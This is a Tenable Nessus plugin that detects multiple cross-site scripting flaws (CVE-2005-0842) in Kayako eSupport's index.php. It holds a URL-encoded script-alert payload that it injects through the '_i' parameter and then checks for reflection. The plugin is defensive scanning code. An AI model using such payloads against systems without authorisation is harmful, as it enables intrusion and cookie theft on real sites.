#
# (C) Tenable Network Security, Inc.
#



include("compat.inc");

if (description) {
  script_id(17598);
  script_version("$Revision: 1.10 $");

  script_cve_id("CVE-2005-0842");
  script_bugtraq_id(12868);
  script_xref(name:"OSVDB", value:"14963");

  script_name(english:"Kayako eSupport Troubleshooter Module index.php Multiple Parameter XSS");
 
 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP script that is affected by
several cross-site scripting vulnerabilities." );
 script_set_attribute(attribute:"description", value:
"The version of Kayako eSupport installed on the remote host is subject
to multiple cross-site scripting vulnerabilities in the script
'index.php' through the parameters '_i' and '_c'.  These issues may
allow an attacker to inject HTML and script code into a user's browser
within the context of the remote site, enabling him to steal
authentication cookies, access data recently submitted by the user,
and the like." );
 script_set_attribute(attribute:"see_also", value:"http://www.securityfocus.com/archive/1/393946" );
 script_set_attribute(attribute:"see_also", value:"http://forums.kayako.com/showthread.php?t=2689" );
 script_set_attribute(attribute:"solution", value:
"Upgrade to eSupport 2.3.1 or later." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:M/Au:N/C:N/I:P/A:N" );
script_end_attributes();

 
  summary["english"] = "Checks for multiple cross-site scripting vulnerabilities in Kayako eSupport's index.php";
  script_summary(english:summary["english"]);
 
  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses : XSS");
 
  script_copyright(english:"This script is Copyright (C) 2005-2009 Tenable Network Security, Inc.");

  script_dependencies("http_version.nasl", "cross_site_scripting.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("url_func.inc");


port = get_http_port(default:80);
if (!can_host_php(port:port)) exit(0);
if ( get_kb_item("www/" + port + "/generic_xss") ) exit(0);

# A simple alert.
xss = string("<script>alert('", SCRIPT_NAME, "');</script>");
exss = urlencode(str:xss);

# Try the exploit.
test_cgi_xss(port: port, cgi: "/index.php", dirs: cgi_dirs(),
 pass_str: xss, 
 qs: strcat("_a=knowledgebase&",
    	    "_j=questiondetails&",
	    "_i=[1]['%3e", exss, "]") );

